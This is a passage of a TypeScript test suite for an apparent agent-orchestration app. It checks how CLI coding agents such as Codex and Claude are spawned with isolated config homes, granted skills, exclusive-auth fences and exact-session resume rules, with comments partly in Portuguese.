    allowedSkills: string[] | null,
  ): BoundSpawnAuthority {
    const base = revisionBoundWorker();
    return {
      ...base,
      context: { ...base.context!, allowedSkills },
    };
  }

  it("materializa a skill concedida no CODEX_HOME privado também no operator-choice", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-skills-"));
    const home = path.join(root, "home");
    const cleanupHook = installGovernedCodexTestHook(root);
    seedSourceSkills(home);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();

    try {
      const worker = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeCodexAdapter(),
        {},
        workerWithSkills(["granted-skill"]),
      );
      const spec = h.specFor(worker.sessionId);
      // Operator-choice isolado: o MCP ambient do ~/.codex real não vaza para
      // o worker — CODEX_HOME privado recebe a concessão, o perfil real fica
      // intocado (prepareCodexOperatorMissionHome).
      expect(spec.env.CODEX_HOME).toBeTruthy();
      expect(
        fs.existsSync(
          path.join(spec.env.CODEX_HOME!, "skills", "granted-skill", "SKILL.md"),
        ),
      ).toBe(true);
      expect(
        fs.existsSync(path.join(spec.env.CODEX_HOME!, "skills", "ungranted-skill")),
      ).toBe(false);
      expect(
        fs.existsSync(path.join(home, ".codex", "skills", "granted-skill")),
      ).toBe(false);
      killSession(owner, worker.sessionId);
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("não entrega skill nenhuma quando o agente não recebeu concessão nominal", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-nogrant-"));
    const home = path.join(root, "home");
    const cleanupHook = installGovernedCodexTestHook(root);
    seedSourceSkills(home);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();

    try {
      // allowedTools: [] já torna a sessão gated; allowedSkills null é o gate
      // LÓGICO aberto, que nunca vira herança física de skill executável.
      const worker = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeCodexAdapter(),
        {},
        workerWithSkills(null),
      );
      const realSkills = path.join(home, ".codex", "skills");
      expect(fs.existsSync(path.join(realSkills, "granted-skill"))).toBe(false);
      expect(fs.existsSync(path.join(realSkills, "ungranted-skill"))).toBe(
        false,
      );
      killSession(owner, worker.sessionId);
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "linux")(
    "modo endurecido entrega no CODEX_HOME privado, sem filtro de skill (F-1157), e nunca no perfil real",
    () => {
    setSquadCliPolicyLookupForTests(() => "governed");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-sealed-"));
    const home = path.join(root, "home");
    const cleanupHook = installGovernedCodexTestHook(root);
    seedSourceSkills(home);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();

    try {
      const worker = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeCodexAdapter(),
        {},
        workerWithSkills(["granted-skill"]),
      );
      const spec = h.specFor(worker.sessionId);
      expect(spec.env.CODEX_HOME).toBeTruthy();
      expect(
        fs.existsSync(
          path.join(spec.env.CODEX_HOME!, "skills", "granted-skill", "SKILL.md"),
        ),
      ).toBe(true);
      // F-1157: sem filtro de skill no overlay privado.
      expect(
        fs.existsSync(path.join(spec.env.CODEX_HOME!, "skills", "ungranted-skill", "SKILL.md")),
      ).toBe(true);
      // O perfil real do usuário nunca é semeado quando existe overlay.
      expect(
        fs.existsSync(path.join(home, ".codex", "skills", "granted-skill")),
      ).toBe(false);
      killSession(owner, worker.sessionId);
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );
});

describe("cli-agent spawn argv hardening", () => {
  it.runIf(process.platform !== "linux")(
    "isolates governed and direct Codex stores while preserving direct profile settings",
    () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-spawn-"));
    const home = path.join(root, "home");
    const realCodexHome = path.join(home, ".codex");
    fs.mkdirSync(path.join(realCodexHome, "plugins", "external"), {
      recursive: true,
    });
    fs.writeFileSync(
      path.join(realCodexHome, "config.toml"),
      '[mcp_servers.external]\ncommand = "external-mcp"\n',
    );
    fs.writeFileSync(path.join(realCodexHome, "auth.json"), "{}");
    const h = fakeHost();
    const mintedTokens: string[] = [];
    setPtyHost(h.host);
    vi.stubEnv("HOME", home);
    setAgentSpawnHook((_adapter, _request, authority) => {
      const meta = authority.context;
      const ctx = mintToken({
        label: "test",
        role: meta?.role ?? "user",
        missionId: meta?.missionId,
        contextRevision: meta?.contextRevision,
        workerIncarnationId: meta?.workerIncarnationId,
        scope: authority.coordinationScope ?? authority.scope,
        executionScope: authority.scope,
        allowedTools: meta?.allowedTools ?? null,
        allowedSkills: meta?.allowedSkills ?? null,
      });
      mintedTokens.push(ctx.token);
      return {
        authorityToken: ctx.token,
        env: {
          NEXUS_MCP_TOKEN: ctx.token,
          NEXUS_HOOK_URL: "http://127.0.0.1:5123/hook/status",
        },
        extraArgs: [
          "-c",
          'mcp_servers.nexus.url="http://127.0.0.1:1/mcp"',
          "--dangerously-bypass-hook-trust",
        ],
      };
    });
    const adapter = makeCodexAdapter();
    const owner = fakeWc();

    try {
      const governed = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        { keyEnv: { CODEX_HOME: realCodexHome } },
        revisionBoundWorker(),
      );
      const governedSpec = h.specFor(governed.sessionId);
      expectHookLoopbackGrant(governedSpec, 5123);
      expect(governedCodexArgv(governedSpec)).toContain(
        "--dangerously-bypass-hook-trust",
      );
      expect(governedSpec.args).toContain("--strict-config");
      expect(governedSpec.args).toEqual(
        expect.arrayContaining(["--disable", "multi_agent"]),
      );
      expect(governedSpec.env.CODEX_HOME).not.toBe(realCodexHome);
      const governedConfig = parse(
        fs.readFileSync(
          path.join(governedSpec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        projects?: Record<string, { trust_level?: string }>;
      };
      expect(
        governedConfig.projects?.[revisionBoundWorker().cwd]?.trust_level,
      ).toBe("untrusted");
      expect(
        fs.existsSync(path.join(governedSpec.env.CODEX_HOME!, "plugins")),
      ).toBe(false);

      const direct = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        { keyEnv: { CODEX_HOME: realCodexHome } },
        trustedSpawn(),
      );
      const directSpec = h.specFor(direct.sessionId);
      expect(directSpec.args).not.toContain("--strict-config");
      expect(directSpec.args).not.toContain("multi_agent");
      expect(directSpec.env.CODEX_HOME).not.toBe(realCodexHome);
      expect(directSpec.env.CODEX_SQLITE_HOME).toBe(fs.realpathSync(path.join(
        app.getPath("userData"), "provider-state", "codex", "checkout-test",
      )));
      const directConfig = parse(fs.readFileSync(path.join(directSpec.env.CODEX_HOME!, "config.toml"), "utf8"));
      expect(directConfig.mcp_servers).toEqual({ external: { command: "external-mcp" } });
      expect(fs.realpathSync(path.join(directSpec.env.CODEX_HOME!, "plugins"))).toBe(fs.realpathSync(path.join(realCodexHome, "plugins")));
      expect(fs.realpathSync(path.join(directSpec.env.CODEX_HOME!, "auth.json"))).toBe(fs.realpathSync(path.join(realCodexHome, "auth.json")));
      expect(fs.realpathSync(path.join(directSpec.env.CODEX_HOME!, "sessions"))).toBe(fs.realpathSync(path.join(directSpec.env.CODEX_SQLITE_HOME!, "sessions")));
      expect(fs.existsSync(path.join(realCodexHome, "config.toml"))).toBe(true);
      expect(fs.existsSync(path.join(realCodexHome, "plugins"))).toBe(true);

      killSession(owner, governed.sessionId);
      killSession(owner, direct.sessionId);
    } finally {
      for (const token of mintedTokens) cleanupCliMcpSession(token);
      setAgentSpawnHook(null);
      resetGateForTests();
      vi.unstubAllEnvs();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it("preserves the OpenCode checkout data home over the managed-account keyEnv", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-opencode-env-"));
    const h = fakeHost();
    setPtyHost(h.host);
    const checkoutEnv = {
      XDG_DATA_HOME: path.join(root, "checkout", "data"),
      XDG_STATE_HOME: path.join(root, "checkout", "state"),
      OPENCODE_DB: path.join(root, "checkout", "opencode.db"),
    };
    setAgentSpawnHook(() => ({ authorityToken: "opencode-env-test", env: checkoutEnv, extraArgs: [] }));
    const owner = fakeWc();
    try {
      const session = spawnAgentSession(owner, { kind: "cli-agent", cols: 80, rows: 24 }, builtinCliPtyAdapter("opencode"),
        { keyEnv: { XDG_DATA_HOME: path.join(root, "managed-account") } }, trustedSpawn());
      expect(h.specFor(session.sessionId).env).toMatchObject(checkoutEnv);
      killSession(owner, session.sessionId);
    } finally {
      setAgentSpawnHook(null);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("denies a second exclusive-auth orchestrator even when the first is detached", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-claude-first",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(),
    );

    expect(() =>
      spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-claude-second",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      ),
    ).toThrow(/exclusive auth family.*physical exit proof/i);
    expect(
      listAgentSessions().filter((session) => session.adapterId === "claude"),
    ).toHaveLength(1);
    orchKillSession(first.sessionId, { startKey: first.startKey });
  });

  it("terminate-with-proof releases the exclusive fence after the orchestrator turned non-live (2026-08-17 wedge)", async () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const spawnOrchestrator = (paneId: string) =>
      spawnAgentSession(
        null,
        { kind: "cli-agent", paneId, cols: 80, rows: 24 },
        adapter,
        {},
        missionGrantFor("mission-wedge"),
      );

    const first = spawnOrchestrator("pane-wedge-1");
    // O renderer marcou a CLI como morta ('exited') enquanto o processo seguia
    // registrado: liveOrchestratorSessionId diz morto, a cerca diz vivo. Era o
    // beco do 17/08 — todo respawn recusado para sempre.
    publishSessionActivityState(first.sessionId, "exited");

    const registered = registeredOrchestratorSessionsForMission(
      "mission-wedge",
    );
    expect(registered).toHaveLength(1);
    expect(registered[0]!.state).toBe("exited");
    expect(registered[0]!.sessionId).toBe(first.sessionId);

    // A cerca continua recusando enquanto a sessão está registrada…
    expect(() => spawnOrchestrator("pane-wedge-2")).toThrow(
      /exclusive auth family.*physical exit proof/i,
    );
    // …e o término com prova física é a saída sancionada: depois dele, o
    // spawn da MESMA missão passa.
    await expect(orchTerminateSession(first.sessionId)).resolves.toBe(true);
    expect(getSessionState(first.sessionId)).toBeNull();
    const second = spawnOrchestrator("pane-wedge-2");
    expect(getSessionState(second.sessionId)).not.toBeNull();
    orchKillSession(second.sessionId);
    await orchTerminateSession(second.sessionId);
  });

  it("allows a second exclusive-auth orchestrator for a different mission", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-claude-mission-a",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrantFor("mission-a"),
    );
    const second = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-claude-mission-b",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrantFor("mission-b"),
    );
    expect(
      listAgentSessions().filter((session) => session.adapterId === "claude"),
    ).toHaveLength(2);
    orchKillSession(first.sessionId, { startKey: first.startKey });
    orchKillSession(second.sessionId, { startKey: second.startKey });
  });

  it("revokes a stubborn PTY bearer but keeps exclusivity until process-tree proof", async () => {
    resetGateForTests();
    const spawnedHandlers: PtySessionHandlers[] = [];
    const terminate = vi.fn(async () => ({
      ok: false,
      rootExited: false,
      descendantsExited: false,
    }));
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate,
    };
    setPtyHost({
      spawn(_spec, handlers) {
        spawnedHandlers.push(handlers);
        return proc;
      },
    });
    const adapter: CliPtyAdapter = {
      ...makeAdapter({
        static: {},
        passthrough: [],
        ephemeralHome: false,
      }),
      id: "claude",
      label: "Claude",
    };
    const authority = missionGrant();
    const first = spawnAgentSession(
      null,
      {
        kind: "cli-agent",
        paneId: "pane-stubborn-claude",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      authority,
    );
    const gate = mintToken({
      label: "stubborn claude",
      role: "orchestrator",
      missionId: "mission-stubborn",
      scope: authority.scope,
      allowedTools: null,
      allowedSkills: null,
    });
    bindTokenToSession(gate.token, first.sessionId);

    const terminationTap = vi.fn();
    const disposeObserver = tapSessionTermination(terminationTap);
    const disposeRevocation = installMcpSessionTerminationRevocation();
    try {
      const termination = orchTerminateSession(first.sessionId, {
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // Logical authority is revoked synchronously, before either signal can
      // produce physical exit proof.
      expect(getContext(gate.token)).toBeNull();
      expect(terminationTap).toHaveBeenCalledOnce();
      await expect(termination).resolves.toBe(false);
      expect(proc.terminate).toHaveBeenCalledWith({
        termTimeoutMs: 1,
        killTimeoutMs: 1,
      });

      // The dead bearer does not authorize replacement: the physical process
      // remains in main's inventory until the host reports its real exit.
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-too-early",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(false);
      expect(terminationTap).toHaveBeenCalledOnce();

      // A root callback immediately re-queries the host's stable descendant
      // receipt; make that natural-exit race the successful proof attempt.
      terminate.mockResolvedValueOnce({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      });
      spawnedHandlers[0]?.onExit(0, 9);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(true);
      expect(() =>
        spawnAgentSession(
          null,
          {
            kind: "cli-agent",
            paneId: "pane-replacement-root-only",
            cols: 80,
            rows: 24,
          },
          adapter,
          {},
          missionGrant(),
        ),
      ).toThrow(/exclusive auth family.*physical exit proof/i);

      await expect(
        orchTerminateSession(first.sessionId, {
          termTimeoutMs: 1,
          killTimeoutMs: 1,
        }),
      ).resolves.toBe(true);
      expect(
        listAgentSessions().some(
          (session) => session.sessionId === first.sessionId,
        ),
      ).toBe(false);

      const replacement = spawnAgentSession(
        null,
        {
          kind: "cli-agent",
          paneId: "pane-replacement-after-exit",
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        missionGrant(),
      );
      orchKillSession(replacement.sessionId);
    } finally {
      disposeRevocation();
      disposeObserver();
      spawnedHandlers[0]?.onExit(0, 9);
      resetGateForTests();
    }
  });

  it("respawns a persisted mission fresh when its provider session died with the app", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup(() => null);
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
        sessionIdArg: "--session-id",
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-persisted",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        persistedMissionGrant(),
      );
      // No dead pane: fresh incarnation under the same sealed contract.
      expect(spawned.resumeMode).toBe("fresh-context");
      const args = h.specFor(spawned.sessionId).args;
      expect(args).not.toContain("--resume");
      expect(args).not.toContain("--continue");
      // A fresh spawn dictates a NEW provider session id, never a reused one.
      const sessionArgIndex = args.indexOf("--session-id");
      expect(sessionArgIndex).toBeGreaterThanOrEqual(0);
      expect(args[sessionArgIndex + 1]).toMatch(
        /^[0-9a-f]{8}-[0-9a-f-]{27,}$/,
      );
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it("respawns a persisted mission worker fresh when its provider session is gone", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup(() => null);
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-persisted-worker",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        persistedWorkerGrant(),
      );
      expect(spawned.resumeMode).toBe("fresh-context");
      const args = h.specFor(spawned.sessionId).args;
      expect(args).not.toContain("--resume");
      expect(args).not.toContain("--continue");
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it.each(['direct-user', 'persisted-pane'] as const)('resumes %s in a tab using the coordination transcript ledger', (source) => {
    const temp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'tab-resume-')));
    const tab = path.join(temp, 'tab');
    fs.mkdirSync(tab);
    const base = source === 'direct-user' ? trustedSpawn(tab) : persistedMissionGrant(tab);
    const authority = { ...base, coordinationScope: { ...base.scope, rootRealPath: temp } };
    const lookup = vi.fn((seen) => seen.rootRealPath === temp ? 'provider-tab-exact' : null);
    const h = fakeHost(); setPtyHost(h.host); setResumeSessionLookup(lookup);
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }, { resumeIdArgs: ['--resume'] });
    try {
      const spawned = spawnAgentSession(fakeWc(), { kind: 'cli-agent', paneId: 'pane-tab', resume: true, cols: 80, rows: 24 }, adapter, {}, authority);
      expect(spawned.resumeMode).toBe('exact');
      expect(h.specFor(spawned.sessionId).args).toContain('provider-tab-exact');
      // F-721: pane persistido de missão também entrega a raiz selada do spawn.
      if (source === 'persisted-pane') {
        expect(lookup).toHaveBeenCalledWith(authority.coordinationScope, 'pane-tab', adapter.id, undefined, { executionScope: authority.scope });
      } else {
        expect(lookup).toHaveBeenCalledWith(authority.coordinationScope, 'pane-tab', adapter.id, undefined);
      }
      orchKillSession(spawned.sessionId);
    } finally { setResumeSessionLookup(null); fs.rmSync(temp, { recursive: true, force: true }); }
  });

  it('keeps the recorded model in the physical resume argv', () => {
    const h = fakeHost(); setPtyHost(h.host); setResumeSessionLookup(() => 'provider-exact');
    const base = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }, { resumeIdArgs: ['--resume'] });
    const adapter = { ...base, models: { flag: '--model', list: ['gpt-5.4'], default: 'gpt-5.4' },
      spawn: { ...base.spawn, interactive: ['test-cli', '--model', '{{MODEL}}'] } };
    try {
      const result = spawnAgentSession(fakeWc(), { kind: 'cli-agent', paneId: 'pane-preserve-model', resume: true, model: 'gpt-5.4', cols: 80, rows: 24 }, adapter, {}, trustedSpawn());
      expect(h.specFor(result.sessionId).args).toEqual(expect.arrayContaining(['--model', 'gpt-5.4', '--resume', 'provider-exact']));
      orchKillSession(result.sessionId);
    } finally { setResumeSessionLookup(null); }
  });

  it("opens a fresh direct-user session when no exact session exists", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup(() => null);
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-direct",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        trustedSpawn(),
      );
      expect(spawned.resumeMode).toBe("fresh-context");
      expect(h.specFor(spawned.sessionId).args).not.toContain("--continue");
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  it('never emits --session for native MiMo account B when the stored conversation belongs to A', () => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'mimo-resume-owner-'));
    fs.mkdirSync(path.join(home, 'data'));
    vi.stubEnv('MIMOCODE_HOME', home);
    const auth = { key: 'native-a', uid: 'a', baseUrl: 'https://api.xiaomimimo.com/v1' };
    const authority = trustedSpawn();
    saveProviderPaneSession(authority.scope, 'pane-native-mimo', 'mimo-code', { key: 'session_id', id: 'session-native-a' }, undefined, mimoSessionOwnerKey(auth));
    fs.writeFileSync(path.join(home, 'data', 'auth.json'), JSON.stringify({ xiaomi: { type: 'api', key: 'native-b', metadata: { uid: 'b', base_url: auth.baseUrl } } }));
    const h = fakeHost(); setPtyHost(h.host); setResumeSessionLookup(() => 'session-native-a');
    const adapter = { ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }, { resumeIdArgs: ['--session'] }), id: 'mimo-code' };
    adapterTrust.builtinIds.add('mimo-code');
    try {
      const spawned = spawnAgentSession(fakeWc(), { kind: 'cli-agent', paneId: 'pane-native-mimo', resume: true, cols: 80, rows: 24 }, adapter, {}, authority);
      expect(spawned.resumeMode).toBe('fresh-context');
      expect(h.specFor(spawned.sessionId).args).not.toContain('--session');
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null); adapterTrust.builtinIds.delete('mimo-code');
      vi.unstubAllEnvs(); fs.rmSync(home, { recursive: true, force: true });
    }
  });

  it("resumes a persisted mission only with its exact captured provider session", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    setResumeSessionLookup((_scope, paneId, adapterId, accountId) =>
      paneId === "pane-persisted" &&
      adapterId === "test-cli" &&
      accountId === "account-main"
        ? "provider-session-exact"
        : null,
    );
    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      {
        resumeArgs: ["--continue"],
        resumeIdArgs: ["--resume"],
      },
    );

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-persisted",
          accountId: "account-main",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        adapter,
        {},
        persistedMissionGrant(),
      );
      expect(spawned.resumeMode).toBe("exact");
      expect(h.specFor(spawned.sessionId).args).toEqual(
        expect.arrayContaining(["--resume", "provider-session-exact"]),
      );
      expect(h.specFor(spawned.sessionId).args).not.toContain("--continue");
      orchKillSession(spawned.sessionId);
    } finally {
      setResumeSessionLookup(null);
    }
  });

  describe("F-721: retomada da conversa num pane novo (pedido pendente do Main)", () => {
    function tabResumeGrant(exactResumeRequired: boolean): BoundSpawnAuthority {
      const base = trustedSpawn();
      return {
        ...base,
        source: "pending",
        coordinationScope: base.scope,
        context: {
          missionId: "mission-tab",
          agentName: "Orquestrador",
          role: "orchestrator",
          allowedTools: null,
          allowedSkills: null,
          scope: base.scope,
          executionScope: base.scope,
          ...(exactResumeRequired ? { exactResumeRequired: true as const } : {}),
        },
      };
    }
    // Formato do argv de retomada de cada CLI: Claude (`--resume <id>` e
    // `--session-id` ditado no spawn fresco) e Codex (`resume <rollout>`, sem
    // id ditado — o rollout novo só aparecia depois, no scanner: campo 02/10
    // 09:14, Maestro gpt-6.1-sol abriu o rollout 01a0fc89 vazio).
    const shapes = [
      { cli: "claude", resumeIdArgs: ["--resume"], sessionIdArg: "--session-id" },
      { cli: "codex", resumeIdArgs: ["resume"], sessionIdArg: undefined },
    ] as const;
    const adapter = (shape: (typeof shapes)[number]) =>
      makeAdapter(
        { static: {}, passthrough: [], ephemeralHome: false },
        {
          resumeIdArgs: [...shape.resumeIdArgs],
          ...(shape.sessionIdArg ? { sessionIdArg: shape.sessionIdArg } : {}),
        },
      );
    const request = {
      kind: "cli-agent" as const,
      paneId: "pane-retomado",
      accountId: "acct-a",
      resume: true,
      cols: 80,
      rows: 24,
    };

    it.each(shapes)("$cli: retoma a conversa copiada com a raiz selada do spawn", (shape) => {
      const h = fakeHost();
      setPtyHost(h.host);
      const authority = tabResumeGrant(true);
      const lookup = vi.fn(() => "conversa-do-lider");
      setResumeSessionLookup(lookup);
      try {
        const spawned = spawnAgentSession(fakeWc(), request, adapter(shape), {}, authority);
        expect(spawned.resumeMode).toBe("exact");
        const args = h.specFor(spawned.sessionId).args;
        expect(args).toEqual(
          expect.arrayContaining([...shape.resumeIdArgs, "conversa-do-lider"]),
        );
        expect(args).not.toContain("--session-id");
        expect(lookup).toHaveBeenCalledWith(
          authority.coordinationScope,
          "pane-retomado",
          "test-cli",
          "acct-a",
          { executionScope: authority.scope },
        );
        orchKillSession(spawned.sessionId);
      } finally {
        setResumeSessionLookup(null);
      }
    });

    it.each(shapes)("$cli: recusa abrir conversa nova quando a conversa copiada não é encontrada", (shape) => {
      const h = fakeHost();
      const physicalSpawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);
      setResumeSessionLookup(() => null);
      try {
        expect(() =>
          spawnAgentSession(fakeWc(), request, adapter(shape), {}, tabResumeGrant(true)),
        ).toThrow(/não foi encontrada no spawn/);
        expect(physicalSpawn).not.toHaveBeenCalled();
        // Sem conversa copiada (pane de origem sem sessão gravada) segue o
        // contexto novo de sempre.
        const fresh = spawnAgentSession(fakeWc(), request, adapter(shape), {}, tabResumeGrant(false));
        expect(fresh.resumeMode).toBe("fresh-context");
        expect(h.specFor(fresh.sessionId).args).not.toContain(shape.resumeIdArgs[0]);
        orchKillSession(fresh.sessionId);
      } finally {
        setResumeSessionLookup(null);
      }
    });
  });

  it("injects the managed hook endpoint and the main-owned PTY session key", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      );
      expect(h.specFor(sessionId).env.NEXUS_AGENT_HOOK_ENDPOINT).toBe(
        "/tmp/nexus-hooks/endpoint.env",
      );
      expect(h.specFor(sessionId).env.NEXUS_PANE_KEY).toBe(sessionId);
      // Without a stable paneId no NEXUS_PANE_ID value is invented.
      expect(h.specFor(sessionId).env.NEXUS_PANE_ID).toBeUndefined();
      killSession(owner, sessionId);
    } finally {
      configureAgentHookEndpointPath(null);
    }
  });

  it("B1: a pane restored after the boot hook step carries hook identity; one spawned before it never gains it", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const spawnRestored = (paneId: string) =>
      spawnAgentSession(
        owner,
        { kind: "cli-agent", paneId, cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      ).sessionId;
    configureAgentHookEndpointPath(null);
    let early: string | undefined;
    let restored: string | undefined;
    try {
      // Spawn before the endpoint exists (the bug: hook server in the idle queue).
      early = spawnRestored("pane-before-hooks");
      expect(h.specFor(early).env.NEXUS_PANE_KEY).toBeUndefined();
      // Boot hook step (main.ts, before startMainWindowRenderer).
      configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
      expect(h.specFor(early).env.NEXUS_PANE_KEY).toBeUndefined();
      // Pane restored on mount, after the boot hook step.
      restored = spawnRestored("pane-restored-at-mount");
      const env = h.specFor(restored).env;
      expect(env.NEXUS_AGENT_HOOK_ENDPOINT).toBe("/tmp/nexus-hooks/endpoint.env");
      expect(env.NEXUS_PANE_KEY).toBe(restored);
      expect(env.NEXUS_PANE_ID).toBe("pane-restored-at-mount");
      expect(env.NEXUS_PANE_ARMS_DESCRIPTOR).toEqual(expect.any(String));
    } finally {
      if (early) killSession(owner, early);
      if (restored) killSession(owner, restored);
      configureAgentHookEndpointPath(null);
    }
  });

  it("injects the stable paneId as NEXUS_PANE_ID when the spawn has one", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", paneId: "pane-stable", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      );
      const env = h.specFor(sessionId).env;
      expect(env.NEXUS_PANE_ID).toBe("pane-stable");
      expect(env.NEXUS_PANE_KEY).toBe(sessionId);
      killSession(owner, sessionId);
    } finally {
      configureAgentHookEndpointPath(null);
    }
  });

  it.runIf(process.platform === 'darwin').each(['user', 'worker', 'read-only'] as const)('F-1101: final Grok host environment rejects shell override (%s)', async lane => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nexus-grok-shell-')), home = path.join(root, 'home'), cwd = path.join(root, 'workspace'), runtime = path.join(root, 'runtime');
    for (const directory of [home, cwd, runtime]) fs.mkdirSync(directory);
    vi.stubEnv('HOME', home); vi.stubEnv('USERPROFILE', home); setSquadCliPolicyLookupForTests(() => lane === 'read-only' ? 'governed' : 'operator-choice');
    const h = fakeHost(); setPtyHost(h.host); const token = `finite-grok-${lane}`;
